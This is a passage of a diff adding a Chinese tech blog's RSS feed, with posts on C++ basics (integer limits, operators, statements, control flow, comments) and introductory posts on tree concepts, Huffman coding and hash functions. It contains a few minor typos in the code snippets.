+&lt;td&gt;SHRT_MIN&lt;/td&gt;
+&lt;td&gt;USHRT_MAX&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;INT_MAX&lt;/td&gt;
+&lt;td&gt;INT_MIN&lt;/td&gt;
+&lt;td&gt;UINT_MAX&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;LONG_MAX&lt;/td&gt;
+&lt;td&gt;LONG_MIN&lt;/td&gt;
+&lt;td&gt;ULONG_MAX&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;LLONG_MAX&lt;/td&gt;
+&lt;td&gt;LLONG_MIN&lt;/td&gt;
+&lt;td&gt;ULLONG_MAX&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;而如果要使用确定长度的变量，可以使用&lt;code&gt;cints&lt;/code&gt;中的&lt;code&gt;int8_t&lt;/code&gt;，&lt;code&gt;int16_t&lt;/code&gt;，&lt;code&gt;int32_t&lt;/code&gt;和&lt;code&gt;uint8_t&lt;/code&gt;，&lt;code&gt;uint16_t&lt;/code&gt;，&lt;code&gt;uint32_t&lt;/code&gt;及由CPU字长决定的&lt;code&gt;size_t&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;:::&lt;/p&gt;
+&lt;h2&gt;4. 运算符&lt;/h2&gt;
+&lt;h3&gt;4.1. 算术运算符&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;code&gt;+&lt;/code&gt;：算术加法&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;code&gt;-&lt;/code&gt;：算术减法&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;code&gt;*&lt;/code&gt;：算术乘法&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;code&gt;/&lt;/code&gt;：算术除法，当两个操作数都是整数时，舍去结果的小数部分&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;code&gt;%&lt;/code&gt;：求模，取余数，操作数必须是整数&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h4&gt;4.2. 赋值运算符、组合赋值运算符&lt;/h4&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;=&lt;/code&gt;：将右侧值赋给左侧&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;+=&lt;/code&gt;：将左侧变量加上右侧的值&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;-=&lt;/code&gt;：将左侧变量减去右侧的值&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;*=&lt;/code&gt;：同上&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;/=&lt;/code&gt;：同上&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;%=&lt;/code&gt;：同上&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;++&lt;/code&gt;：左/右侧变量自增1，并返回变量原先/更改后的值，根据代码中符号和变量位置关系可以直观判断先运算还是先返回值&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;--&lt;/code&gt;：左/右侧变量自减1，并返回变量原先/更改后的值，根据代码中符号和变量位置关系可以直观判断先运算还是先返回值&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h4&gt;4.3. 关系运算符&lt;/h4&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;==&lt;/code&gt;：相等&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;&amp;lt;&lt;/code&gt;：小于&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;&amp;gt;&lt;/code&gt;：大于&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;&amp;lt;=&lt;/code&gt;：小于等于&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;&amp;gt;=&lt;/code&gt;：大于等于&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;!=&lt;/code&gt;：不等于&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h4&gt;4.4. 逻辑运算符&lt;/h4&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;||&lt;/code&gt;：逻辑或&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;&amp;amp;&amp;amp;&lt;/code&gt;：逻辑与&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;!&lt;/code&gt;：逻辑非&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h4&gt;4.5. 条件运算符&lt;/h4&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;?:&lt;/code&gt;：&lt;code&gt;condition?expr1:expr2&lt;/code&gt;与&lt;code&gt;if&lt;/code&gt;语句基本相同，若&lt;code&gt;condition&lt;/code&gt;为&lt;code&gt;true&lt;/code&gt;则表达式的值为&lt;code&gt;expr1&lt;/code&gt;的值，反之则为&lt;code&gt;expr2&lt;/code&gt;的值，&lt;code&gt;expr1&lt;/code&gt;和&lt;code&gt;expr2&lt;/code&gt;必须是相同的类型&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h4&gt;4.6. 逗号运算符&lt;/h4&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;,&lt;/code&gt;：用于拼接两个表达式，常用在&lt;code&gt;for&lt;/code&gt;循环中，整个表达式的值是逗号后面的值&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h4&gt;4.7. 按位运算符&lt;/h4&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;&amp;lt;&amp;lt;&lt;/code&gt;：左移位，右边用0填充，可实现快速乘2&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;&amp;gt;&amp;gt;&lt;/code&gt;：右移位，左边用符号位填充（无符号填充0），可实现快速除2&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;~&lt;/code&gt;：按位取反&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;|&lt;/code&gt;：按位或&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;&amp;amp;&lt;/code&gt;：按位与&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;^&lt;/code&gt;：按位异或&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;以上按位运算符均可和赋值运算符组成组合赋值运算符&lt;/p&gt;
+&lt;h4&gt;4.8. 其它运算符&lt;/h4&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;.&lt;/code&gt;/&lt;code&gt;-&amp;gt;&lt;/code&gt;：成员运算符&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;*&lt;/code&gt;：解引用&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;&amp;amp;&lt;/code&gt;：取地址&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;.*&lt;/code&gt;/&lt;code&gt;-&amp;gt;*&lt;/code&gt;：成员解引用&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;new&lt;/code&gt;：动态分配内存&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;delete&lt;/code&gt;：动态回收内存&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;sizeof&lt;/code&gt;：返回操作数的内存大小（单位字节）&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;alignof&lt;/code&gt;：返回对应类型在内存中的对齐方式&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;noexcept&lt;/code&gt;：指出函数不会引发异常&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h4&gt;4.9. 运算符优先级、结合性与顺序点&lt;/h4&gt;
+&lt;ul&gt;
+&lt;li&gt;运算符优先级：&lt;code&gt;C++&lt;/code&gt;运算符有一定的优先级，在一个表达式中有多个运算符时，编译器会优先考虑优先级高的先算，其次考虑结合性，可以使用括号调节优先级&lt;/li&gt;
+&lt;li&gt;运算符结合性：当优先级相同的两个运算符作用于同一个对象时，&lt;code&gt;C++&lt;/code&gt;会考虑按照结合性从左到右或者从右到左结合，但一般推荐使用括号明确顺序以增加可读性并避免潜在问题&lt;/li&gt;
+&lt;li&gt;顺序点：有的运算符（自增、自减）会产生副作用，调用函数也可能产生副作用，&lt;code&gt;C++&lt;/code&gt;保证在遇到顺序点时计算出所有的副作用。顺序点包括分号、逗号运算符和完整表达式（不被其它表达式包含的表达式），如&lt;code&gt;(i++) + (++i)&lt;/code&gt;中，&lt;code&gt;(i++)&lt;/code&gt;和&lt;code&gt;(++i)&lt;/code&gt;都不是完整表达式，&lt;code&gt;C++&lt;/code&gt;不保证在计算加法时计算出任何一者的副作用，该表达式在不同编译器上可能产生不同效果&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2&gt;5. 语句&lt;/h2&gt;
+&lt;p&gt;&lt;code&gt;C++&lt;/code&gt;是由一系列语句组成的命令式语言，每个语句都以&lt;code&gt;;&lt;/code&gt;结尾&lt;/p&gt;
+&lt;h4&gt;5.1. 声明语句&lt;/h4&gt;
+&lt;p&gt;&lt;code&gt;type name;&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;声明一个变量，程序将根据变量类型分配一块合适的内存空间&lt;/p&gt;
+&lt;p&gt;也可以声明一个外部变量的引用，此时不会分配内存空间，而是提供一个访问外部变量的名称&lt;/p&gt;
+&lt;p&gt;多个同类型的变量可以一起声明&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;type name1 name2 name3;&lt;/code&gt;&lt;/p&gt;
+&lt;h4&gt;5.2. 赋值语句&lt;/h4&gt;
+&lt;p&gt;&lt;code&gt;name = value;&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;将&lt;code&gt;value&lt;/code&gt;的值赋给&lt;code&gt;name&lt;/code&gt;变量，左边必须是一个变量，而右边可以是字面值，也可以是表达式&lt;/p&gt;
+&lt;p&gt;声明语句和赋值语句可以合并为&lt;code&gt;type name = value;&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;注意多个变量同时声明时，必须单独分别赋值，无法同时赋值，如&lt;code&gt;type var1 var2 = value;&lt;/code&gt;实际上只给&lt;code&gt;var2&lt;/code&gt;赋值了&lt;/p&gt;
+&lt;p&gt;多个赋值语句也可以合并，如&lt;code&gt;var1 = var2 = var3 = value;&lt;/code&gt;将同时给3个变量赋同样的值&lt;/p&gt;
+&lt;p&gt;:::tip&lt;/p&gt;
+&lt;p&gt;在&lt;code&gt;C++11&lt;/code&gt;中，在赋值和声明语句结合时可以使用&lt;code&gt;auto&lt;/code&gt;关键字作为类型名，编译器将根据赋值表达式的类型自动推断类型&lt;/p&gt;
+&lt;p&gt;:::&lt;/p&gt;
+&lt;h4&gt;5.3. 表达式语句&lt;/h4&gt;
+&lt;p&gt;在&lt;code&gt;C++&lt;/code&gt;中，任何一个合法的表达式，包括函数调用，都可以是一个合法的语句，表达式的值可以被直接忽略&lt;/p&gt;
+&lt;p&gt;如&lt;code&gt;1+2;&lt;/code&gt;，&lt;code&gt;pow(2,2)*3;&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;:::note&lt;/p&gt;
+&lt;p&gt;一般认为表达式都是有值的，故赋值语句一般也认为是赋值表达式&lt;/p&gt;
+&lt;p&gt;表达式都是语句，但语句不一定是表达式，声明语句就没有对应的值&lt;/p&gt;
+&lt;p&gt;::::&lt;/p&gt;
+&lt;h4&gt;5.4. 流程控制语句&lt;/h4&gt;
+&lt;p&gt;用于控制程序的运行流程的语句，详见下节&lt;/p&gt;
+&lt;h2&gt;6. 流程控制&lt;/h2&gt;
+&lt;h3&gt;6.1. 分支语句&lt;/h3&gt;
+&lt;h4&gt;if语句&lt;/h4&gt;
+&lt;pre&gt;&lt;code&gt;if(test-condition)
+    //if-statement
+else
+    //else-statement
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;如果&lt;code&gt;test-condition&lt;/code&gt;为真，执行&lt;code&gt;if-statement&lt;/code&gt;，否则执行&lt;code&gt;else-statement&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;else&lt;/code&gt;和&lt;code&gt;else-statement&lt;/code&gt;可以省略，&lt;code&gt;if-statement&lt;/code&gt;也可以省略，当然，不能同时省略&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;if-statement&lt;/code&gt;和&lt;code&gt;else-statement&lt;/code&gt;默认只包含一条语句，可以使用大括号来扩展成语句块&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;else&lt;/code&gt;后面可以再接&lt;code&gt;if&lt;/code&gt;，形成多分支结构&lt;/p&gt;
+&lt;h4&gt;switch语句&lt;/h4&gt;
+&lt;pre&gt;&lt;code&gt;switch(integer-expression)
+{
+    case label1 : statements
+    case label2 : statements
+        ...
+    default : statements
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;code&gt;switch&lt;/code&gt;接收一个整型表达式，每个&lt;code&gt;label&lt;/code&gt;为一个整型常量，该语句会匹配所有&lt;code&gt;label&lt;/code&gt;，并找到相等的执行后面的语句&lt;/p&gt;
+&lt;p&gt;需要注意的是，不同于&lt;code&gt;if&lt;/code&gt;，&lt;code&gt;switch&lt;/code&gt;会执行&lt;code&gt;case&lt;/code&gt;块中的每一条语句直到下一个&lt;code&gt;case&lt;/code&gt;，不需要使用大括号，同时也不会停止匹配，这样会降低运行效率，所以需要在&lt;code&gt;case&lt;/code&gt;块中使用&lt;code&gt;break;&lt;/code&gt;语句手动跳出&lt;code&gt;switch&lt;/code&gt;语句&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;default&lt;/code&gt;块会匹配任意的表达式值作为默认运行的代码，可以省略，如果没有手动使用&lt;code&gt;break&lt;/code&gt;，程序可能会再次匹配&lt;code&gt;default&lt;/code&gt;块，出现运行两次的情况&lt;/p&gt;
+&lt;p&gt;:::note&lt;/p&gt;
+&lt;p&gt;实际开发中，分支往往是慢慢添加的，故&lt;code&gt;switch&lt;/code&gt;语句并不常用，更常用长&lt;code&gt;if-else&lt;/code&gt;结构，可以方便增加分支，语法更灵活，也不用担心忘记&lt;code&gt;break;&lt;/code&gt;，如下所示&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;if(condition1)
+{   
+}else if(condition2)
+{
+}else{
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;:::&lt;/p&gt;
+&lt;h3&gt;6.2. 循环语句&lt;/h3&gt;
+&lt;h4&gt;while语句&lt;/h4&gt;
+&lt;pre&gt;&lt;code&gt;while(test-condition)
+    bady
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;code&gt;while&lt;/code&gt;接收一个&lt;code&gt;test-condition&lt;/code&gt;，若为真则执行&lt;code&gt;body&lt;/code&gt;，同&lt;code&gt;if&lt;/code&gt;一样，它只会执行一条语句，可以用大括号让它执行一个语句块&lt;/p&gt;
+&lt;p&gt;每次循环结束，&lt;code&gt;while&lt;/code&gt;语句都会重新计算一次&lt;code&gt;test-condition&lt;/code&gt;，只要&lt;code&gt;test-condition&lt;/code&gt;为真，它就会一直运行下去&lt;/p&gt;
+&lt;p&gt;:::note&lt;/p&gt;
+&lt;p&gt;由于非0值会被转换为&lt;code&gt;true&lt;/code&gt;的特点，语句&lt;code&gt;while(T--)&lt;/code&gt;会刚好运行&lt;code&gt;T&lt;/code&gt;次（&lt;code&gt;T&lt;/code&gt;是正整数变量），可以简化代码用&lt;/p&gt;
+&lt;p&gt;:::&lt;/p&gt;
+&lt;p&gt;有时也会使用&lt;code&gt;while&lt;/code&gt;的变体&lt;code&gt;do-while&lt;/code&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;do
+    bady
+while(test-condition)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;该语句会先执行&lt;code&gt;body&lt;/code&gt;再判断&lt;code&gt;test-condition&lt;/code&gt;&lt;/p&gt;
+&lt;h4&gt;for语句&lt;/h4&gt;
+&lt;pre&gt;&lt;code&gt;for(init-statement;condition;expression)
+    bady
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;该语句会运行一次&lt;code&gt;init-statement&lt;/code&gt;，然后根据循环条件&lt;code&gt;condition&lt;/code&gt;的值作为循环条件进入循环，并在每次循环结束时执行一次更新表达式&lt;code&gt;expression&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;实际上相当于以下内容&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;init-statement;
+while(condition)
+{
+    bady
+    expression;
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;值得注意的是，&lt;code&gt;init-statement&lt;/code&gt;是一个语句而非表达式，这意味着它可以接受声明语句&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;for&lt;/code&gt;常搭配自增/自减运算符使用，如&lt;code&gt;for(int i = 1;i &amp;lt;= 10;i ++)&lt;/code&gt;将从1到10枚举&lt;code&gt;i&lt;/code&gt;，并运行10次&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;for&lt;/code&gt;循环中&lt;code&gt;init-statement&lt;/code&gt;和&lt;code&gt;expression&lt;/code&gt;都可以省略，但是分号不能省略&lt;/p&gt;
+&lt;h4&gt;break与continue&lt;/h4&gt;
+&lt;p&gt;&lt;code&gt;break&lt;/code&gt;和&lt;code&gt;continue&lt;/code&gt;语句是由单一个关键字组成的流程控制语句&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;break&lt;/code&gt;可以跳出循环，用于&lt;code&gt;while&lt;/code&gt;，&lt;code&gt;for&lt;/code&gt;和&lt;code&gt;switch&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;continue&lt;/code&gt;则可以跳过本次循环，直接进入下一次，不过还是要测试对应的循环条件，&lt;code&gt;for&lt;/code&gt;循环中也会正常运行更新表达式，用于&lt;code&gt;for&lt;/code&gt;和&lt;code&gt;while&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;break&lt;/code&gt;和&lt;code&gt;continue&lt;/code&gt;都只能跳出最内层循环，如果需要跳出多层循环，需要搭配分支语句使用&lt;/p&gt;
+&lt;h2&gt;7.注释&lt;/h2&gt;
+&lt;p&gt;注释是程序中用来说明代码的部分，编译时会被去除&lt;/p&gt;
+&lt;p&gt;养成良好的注释习惯可以帮助自己和他人理解代码&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;C++&lt;/code&gt;中有两种注释&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;单行注释：双斜杠&lt;code&gt;//&lt;/code&gt;后面直到行末的所有内容都会被视为注释&lt;/li&gt;
+&lt;li&gt;多行注释：&lt;code&gt;/**&lt;/code&gt;和&lt;code&gt;**/&lt;/code&gt;之间，无论多少行都会被视为注释&lt;/li&gt;
+&lt;/ul&gt;
+</content:encoded></item><item><title>图论算法三：树的简单应用</title><link>https://ssl.ztsubaki.xyz/posts/8/8/</link><guid isPermaLink="true">https://ssl.ztsubaki.xyz/posts/8/8/</guid><description>图论算法系列第三篇，讲解哈夫曼树、哈希表、字符搜索树这些树的简单应用。</description><pubDate>Mon, 20 Jan 2025 00:00:00 GMT</pubDate><content:encoded>&lt;h2&gt;1.哈夫曼树&lt;/h2&gt;
+&lt;h3&gt;1.1.哈夫曼编码&lt;/h3&gt;
+&lt;p&gt;通常的编码方法有定长编码和不定长编码两种，编码的目的是寻找合适的编码方案使总码长度最短。定长编码常常采用类似哈希的方案，不定长编码则会尽可能使常用的字符编码短，不常用的字符编码长，同时保持无二义性。&lt;/p&gt;
+&lt;p&gt;1952年，数学家D.A.Huffman提出了一种基于哈夫曼树的编码方法，这棵树将被编码字符作为叶子节点，将该字符的使用频率作为权值反复合并，最后构成一棵树，从根到叶子节点的路径即为其编码。&lt;/p&gt;
+&lt;h3&gt;1.2.原理&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;二叉树上每条路径上的每条边都只有两种状态，可用&lt;code&gt;0&lt;/code&gt;或&lt;code&gt;1&lt;/code&gt;表示&lt;/li&gt;
+&lt;li&gt;二叉树上每个叶子节点到根的路径唯一&lt;/li&gt;
+&lt;li&gt;二叉树上每个叶子节点到根的路径不会经过其他叶子节点&lt;/li&gt;
+&lt;li&gt;叶子节点深度即为对应的编码长度&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3&gt;1.3.构造&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;首先以使用频率为权值确定$n$个字符对应的$n$个叶子节点，构成$n$棵树组成的森林&lt;/li&gt;
+&lt;li&gt;接着循环$n-1$次，每次合并权值最小的两个根节点，合并后的节点为新的根节点，连接原来的两个节点，权值为原来的两个结点之和&lt;/li&gt;
+&lt;li&gt;最后产生的树即为哈夫曼树&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3&gt;1.4.拓展：哈希表&lt;/h3&gt;
+&lt;h4&gt;1.4.1.散列函数（哈希函数）&lt;/h4&gt;
+&lt;p&gt;是把任意长度的输入通过散列算法变换成固定长度的输出，该输出就是散列值。&lt;/p&gt;
+&lt;p&gt;这种转换是一种压缩映射，也就是，散列值的空间通常远小于输入的空间，不同的输入可能会散列成相同的输出，所以不可能从散列值来确定唯一的输入值。简单的说就是一种将任意长度的消息压缩到某一固定长度的消息摘要的函数。&lt;/p&gt;
+&lt;h5&gt;应用：&lt;/h5&gt;
+&lt;ul&gt;
+&lt;li&gt;消息摘要&lt;/li&gt;
+&lt;li&gt;散列表（哈希函数）&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h5&gt;常见散列函数：&lt;/h5&gt;
+&lt;ul&gt;
+&lt;li&gt;MD5&lt;/li&gt;
+&lt;li&gt;SHA&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h4&gt;1.4.2.散列函数设计&lt;/h4&gt;
+&lt;p&gt;散列函数设计要遵循以下两个原则：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;尽可能简单&lt;/li&gt;
+&lt;li&gt;尽可能均匀分布以减小冲突&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h4&gt;1.4.3.常见散列方法&lt;/h4&gt;
+&lt;ol&gt;
+&lt;li&gt;直接定址法&lt;/li&gt;
+&lt;li&gt;除留余数法&lt;/li&gt;
+&lt;li&gt;*随机数法&lt;/li&gt;
+&lt;li&gt;*数字分析法&lt;/li&gt;
+&lt;li&gt;*平方取中法&lt;/li&gt;
+&lt;li&gt;*折叠法&lt;/li&gt;
+&lt;li&gt;*基数转换法&lt;/li&gt;
+&lt;li&gt;*全域散列法&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h2&gt;字符搜索树&lt;/h2&gt;
+</content:encoded></item><item><title>图论算法一：树的基本概念</title><link>https://ssl.ztsubaki.xyz/posts/6/6/</link><guid isPermaLink="true">https://ssl.ztsubaki.xyz/posts/6/6/</guid><description>图论算法系列第一篇，讲解树的数学定义</description><pubDate>Sun, 19 Jan 2025 00:00:00 GMT</pubDate><content:encoded>&lt;h2&gt;1.自由树&lt;/h2&gt;
+&lt;p&gt;连通的、无环的无向图。&lt;/p&gt;
+&lt;p&gt;自由树$G=(V,E)$有以下性质：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;$G$是一个无向图&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;$G$中任何两顶点由唯一简单路径相连&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;$G$是连通的，但是从图中移除任意一条边得到的图均不相连&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;$G$是连通的，且$\lvert E\rvert = \lvert V\rvert-1$&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;$G$是无环的，且$\lvert E\rvert=\lvert V\rvert-1$&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;$G$是无环的，但是如果向$E$中添加任何一条边，均会造成图包含一个环&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2&gt;2.森林&lt;/h2&gt;
+&lt;p&gt;一个及以上自由树组成的集合。&lt;/p&gt;
+&lt;p&gt;可能不连通的、无环的无向图。&lt;/p&gt;
+&lt;h2&gt;3.有根树&lt;/h2&gt;
+&lt;h3&gt;3.1.定义&lt;/h3&gt;
+&lt;p&gt;有根树是一棵自由树，其顶点中存在一个与其他顶点不同的节点，称该顶点为树的根。&lt;/p&gt;
+&lt;p&gt;一棵有根树中的任意一个顶点均可以作为这棵树的根。&lt;/p&gt;
+&lt;p&gt;若无特殊说明，我们通常说的&lt;strong&gt;树&lt;/strong&gt;指&lt;strong&gt;有根树&lt;/strong&gt;。&lt;/p&gt;
+&lt;h3&gt;3.2.常用概念&lt;/h3&gt;
+&lt;h4&gt;1 祖先、后代&lt;/h4&gt;
+&lt;p&gt;从一棵树$T$的根节点$r$到任意节点$x$的唯一简单路径上的任意节点$y$称为节点$x$的&lt;strong&gt;祖先&lt;/strong&gt;，反之，如果$y$是$x$的祖先，则$x$是$y$的&lt;strong&gt;后代&lt;/strong&gt;。&lt;/p&gt;
+&lt;p&gt;显然，一个节点与自身互为祖先和后代。&lt;/p&gt;
+&lt;p&gt;如果$x$是$y$的后代，且$x\ne y$，则称$x$是$y$的&lt;strong&gt;真后代&lt;/strong&gt;，$y$是$x$的&lt;strong&gt;真祖先&lt;/strong&gt;。&lt;/p&gt;
+&lt;h4&gt;2 父节点、子节点、兄弟节点&lt;/h4&gt;
+&lt;p&gt;设从一棵树$T$的根节点$r$到任意节点$x$的唯一简单路径上最后一条边是$(y,x)$，则$y$是$x$的&lt;strong&gt;父节点&lt;/strong&gt;，也叫&lt;strong&gt;双亲&lt;/strong&gt;，$x$是$y$的&lt;strong&gt;子节点&lt;/strong&gt;，也叫&lt;strong&gt;孩子&lt;/strong&gt;，如果两个节点有相同的父节点，则它们是&lt;strong&gt;兄弟节点&lt;/strong&gt;。&lt;/p&gt;
+&lt;p&gt;根是树中唯一没有父节点的节点。&lt;/p&gt;
+&lt;h4&gt;3 叶子节点，内部节点&lt;/h4&gt;
+&lt;p&gt;一个没有子节点的节点称为&lt;strong&gt;叶子节点&lt;/strong&gt;，非叶子节点为&lt;strong&gt;内部节点&lt;/strong&gt;。&lt;/p&gt;
+&lt;h4&gt;4 度&lt;/h4&gt;
+&lt;p&gt;有根树$T$中一个节点$x$的子节点数目为$x$的&lt;strong&gt;度&lt;/strong&gt;。&lt;/p&gt;
+&lt;p&gt;:::note&lt;/p&gt;
+&lt;p&gt;与图/自由树不同，有根树中除根节点外均有且只有一条连向父节点的边，故有根树中的度仅考虑连向子节点的边，而不是所有边&lt;/p&gt;
+&lt;p&gt;:::&lt;/p&gt;
+&lt;p&gt;显然，叶子节点就是度为$0$的节点。&lt;/p&gt;
+&lt;h4&gt;5 深度、高度、层&lt;/h4&gt;
+&lt;p&gt;有根树$T$中从根节点$r$到节点$x$的一条简单路径长度即为$x$的&lt;strong&gt;深度&lt;/strong&gt;，从$x$到叶子节点的最长简单路径上边的数目即为$x$的&lt;strong&gt;高度&lt;/strong&gt;，树的一个&lt;strong&gt;层&lt;/strong&gt;包含了同一深度的所有节点。&lt;strong&gt;树的高度&lt;/strong&gt;是指树中节点的&lt;strong&gt;最大深度&lt;/strong&gt;。&lt;/p&gt;
+&lt;p&gt;根节点的深度为$0$，叶子节点的高度为$0$。&lt;/p&gt;
+&lt;h4&gt;6 子树&lt;/h4&gt;
+&lt;p&gt;由有根树$T$中一个节点$x$的所有后代构成的节点称为以$x$为根的子树&lt;/p&gt;
+&lt;h3&gt;3.3.有序树&lt;/h3&gt;
+&lt;p&gt;每个节点的子节点都是有序的有根树&lt;/p&gt;
+&lt;h2&gt;4.二叉树&lt;/h2&gt;
+&lt;h3&gt;4.1.定义&lt;/h3&gt;
+&lt;p&gt;二叉树$T$是定义在有限节点集上的结构，它或者不包含任何节点，或者包含三个不相交的节点集合：一个根节点，一棵称为&lt;strong&gt;左子树&lt;/strong&gt;的二叉树，一棵称为&lt;strong&gt;右子树&lt;/strong&gt;的二叉树。&lt;/p&gt;
+&lt;h3&gt;4.2.常用概念&lt;/h3&gt;
+&lt;h4&gt;1.左孩子、右孩子&lt;/h4&gt;
+&lt;p&gt;若一个节点左子树非空，则左子树的根为该节点的&lt;strong&gt;左孩子&lt;/strong&gt;，若一个节点右子树非空，则右子树的根为该节点的&lt;strong&gt;右孩子&lt;/strong&gt;。&lt;/p&gt;
+&lt;p&gt;二叉树不仅仅是度不超过$2$的有序树的，对于只有一个孩子的节点，区分左孩子和右孩子是必要的。&lt;/p&gt;
+&lt;h4&gt;2.真二叉树&lt;/h4&gt;
+&lt;p&gt;除叶子节点外的节点度均为$2$的二叉树。&lt;/p&gt;
+&lt;h4&gt;3.满二叉树&lt;/h4&gt;
+&lt;p&gt;所有叶子节点深度相同，且所有内部节点度为$2$的二叉树。&lt;/p&gt;
+&lt;p&gt;:::important&lt;/p&gt;
+&lt;p&gt;满二叉树（Full Binary Tree）国内外定义存在不同，国外说的满二叉树一般指国内说的真二叉树。&lt;/p&gt;
+&lt;p&gt;:::&lt;/p&gt;
+&lt;h4&gt;4.完全二叉树&lt;/h4&gt;
+&lt;p&gt;除最后一层，每一层节点数均达到最大值的二叉树。&lt;/p&gt;
+&lt;h4&gt;5.位置树&lt;/h4&gt;
+&lt;p&gt;在一棵&lt;strong&gt;位置树&lt;/strong&gt;中，节点的孩子被标记为不同的正整数，不同于有序树，如果没有孩子被标记为整数$$i$$，则该节点的第$i$个孩子缺失。&lt;/p&gt;
+&lt;h4&gt;6.$k$叉树&lt;/h4&gt;
+&lt;p&gt;若对于位置树的每个节点，所有标记大于$k$的孩子均缺失，则称这棵树为**$k$叉树**。&lt;/p&gt;
+&lt;p&gt;二叉树是$k=2$的$k$叉树。&lt;/p&gt;
